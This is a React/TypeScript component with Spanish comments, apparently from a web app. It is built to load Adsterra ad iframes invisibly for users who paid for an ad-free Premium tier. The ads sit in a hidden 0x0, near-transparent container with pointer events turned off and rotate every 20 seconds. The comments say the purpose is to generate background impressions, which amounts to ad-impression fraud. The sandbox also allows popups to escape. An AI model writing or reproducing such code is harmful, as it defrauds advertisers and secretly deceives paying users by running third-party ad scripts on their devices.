// PremiumGhostAds: motor fantasma de anuncios para usuarios Premium.
// Inyecta un iframe Adsterra dentro de un contenedor 0×0, invisible, intocable
// y silenciado, rotando la creatividad cada N segundos. Genera impresiones de
// fondo sin afectar la experiencia limpia del usuario premium.
//
// Solo se monta cuando el usuario es premium. Para usuarios gratis no hace nada
// (ellos siguen viendo los banners normales en cada sección).
import { useEffect, useRef } from "react";
import { adKey, adsBannerScript } from "@/config/ads";
import { useAuth } from "@/contexts/AuthContext";
import { primeAdDomains } from "@/lib/ad-boot";

const ROTATION_MS = 20_000;

// Pool de creatividades Adsterra (key + tamaño). Cualquier tamaño funciona porque
// vive dentro de un contenedor 0×0 oculto: solo importa que el script corra.
const POOL: Array<{ key: string; w: number; h: number }> = [
  { key: adKey("300x250"), w: 300, h: 250 },
  { key: adKey("160x300"), w: 160, h: 300 },
  { key: adKey("728x90"), w: 728, h: 90 },
  { key: adKey("468x60"), w: 468, h: 60 },
  { key: adKey("160x600"), w: 160, h: 600 },
];

function buildAdHtml(adKey: string, w: number, h: number): string {
  return `<!doctype html><html><head><style>
    html,body{margin:0;padding:0;background:transparent;width:100%;height:100%;overflow:hidden;}
  </style></head><body>
    <script type="text/javascript">
      atOptions = { 'key':'${adKey}','format':'iframe','height':${h},'width':${w},'params':{} };
    </script>
    <script type="text/javascript" src="${adsBannerScript(adKey)}"></script>
  </body></html>`;
}

export default function PremiumGhostAds() {
  const { isPremium, loading } = useAuth();
  const hostRef = useRef<HTMLDivElement>(null);
  const idxRef = useRef(0);

  useEffect(() => {
    if (loading || !isPremium || !hostRef.current) return;
    primeAdDomains();

    const host = hostRef.current;

    const injectNext = () => {
      const { key, w, h } = POOL[idxRef.current % POOL.length];
      idxRef.current += 1;
      // Limpiar iframe anterior para no acumular DOM/memoria.
      host.innerHTML = "";
      const iframe = document.createElement("iframe");
      iframe.style.width = `${w}px`;
      iframe.style.height = `${h}px`;
      iframe.style.border = "0";
      iframe.style.display = "block";
      iframe.scrolling = "no";
      iframe.setAttribute("aria-hidden", "true");
      iframe.setAttribute("tabindex", "-1");
      // Silenciar audio del anuncio fantasma.
      iframe.setAttribute("allow", "autoplay");
      (iframe as any).muted = true;
      // Sandbox: permite scripts y popups (para que cuente impresión y pueda
      // disparar el redirect interno de Adsterra), pero el contenedor padre
      // tiene pointer-events:none y 0×0, así que el usuario nunca interactúa.
      iframe.setAttribute(
        "sandbox",
        "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-same-origin"
      );
      iframe.srcdoc = buildAdHtml(key, w, h);
      host.appendChild(iframe);
    };

    injectNext();
    const t = window.setInterval(injectNext, ROTATION_MS);
    return () => {
      window.clearInterval(t);
      try { host.innerHTML = ""; } catch {}
    };
  }, [isPremium, loading]);

  if (loading || !isPremium) return null;

  return (
    <div
      ref={hostRef}
      aria-hidden
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: 0,
        height: 0,
        overflow: "hidden",
        opacity: 0.001,
        pointerEvents: "none",
        zIndex: -1,
      }}
    />
  );
}
